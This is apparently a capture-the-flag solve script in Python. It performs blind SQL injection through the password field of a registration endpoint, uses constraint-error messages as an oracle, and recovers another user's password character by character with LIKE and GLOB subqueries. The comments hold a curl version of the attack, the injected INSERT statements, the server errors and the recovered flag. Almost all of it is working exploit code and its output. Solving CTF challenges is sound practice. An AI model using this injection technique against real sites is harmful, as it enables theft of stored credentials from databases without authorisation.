import requests, string, time

url = 'http://phish.sg.ctf.so/add'
chars = string.printable
foundchars = ''
solvestr = 'we{'

for i in chars:
    send = {'username':'abc', 'password':f'a\',(SELECT password FROM user WHERE username = \"shou\" AND password LIKE \"%{i}%\")); --'}
    r = requests.post(url, data=send)
    if 'UNIQUE' in r.text: foundchars+=i
    time.sleep(0.1)
print(f'\n\n\n{(len(foundchars)+7)*"-"}\nFound: {foundchars}\n{(len(foundchars)+7)*"-"}\n\nTrying\t| Solved')

while solvestr[-1]!='}':
    for i in foundchars:
        send = {'username':'abc', 'password':f'a\',(SELECT password FROM user WHERE username = \"shou\" AND password GLOB \"{solvestr+i}*\"));--'}
        r = requests.post(url, data=send)
        if 'UNIQUE' in r.text: solvestr+=i
        print(f'{i}\t| {solvestr+i}', end='\r')
        time.sleep(0.1)
print(f'\n\nSolved: {solvestr}\n')

# Found: 013456789abcdefhimnpqstuwABCDEFHIMNPQSTUW%-@_{}
# Solved: we{e0df7105-edcd-4dc6-8349-f3bef83643a9@h0P3_u_didnt_u3e_sq1m4P}



# curl -X POST http://phish.sg.ctf.so/add --data "username=abc'&password=a',(SELECT password FROM user WHERE username = \"shou\" AND password LIKE \"%abc%\")); --"

# INSERT INTO `user`(password, username) VALUES ('a',(SELECT password FROM user WHERE username = "shou" AND password LIKE "%---HERE---%")); --', 'abc'')
# Err: INSERT INTO `user`(password, username) VALUES ('a',(SELECT password FROM user WHERE username = "shou" AND password LIKE "%a%")); --', 'abc'') <br>UNIQUE constraint failed: user.username
# Err: INSERT INTO `user`(password, username) VALUES ('a',(SELECT password FROM user WHERE username = "shou" AND password LIKE "%z%")); --', 'abc'') <br>NOT NULL constraint failed: user.username


# INSERT INTO `user`(password, username) VALUES ('a',(SELECT password FROM user WHERE username = "shou" AND password GLOB "---HERE---*"));--', 'abc')
# Err: INSERT INTO `user`(password, username) VALUES ('a',(SELECT password FROM user WHERE username = "shou" AND password GLOB "w*")); --', 'abc'') <br>UNIQUE constraint failed: user.username
# Err: INSERT INTO `user`(password, username) VALUES ('a',(SELECT password FROM user WHERE username = "shou" AND password GLOB "x*")); --', 'abc'') <br>NOT NULL constraint failed: user.username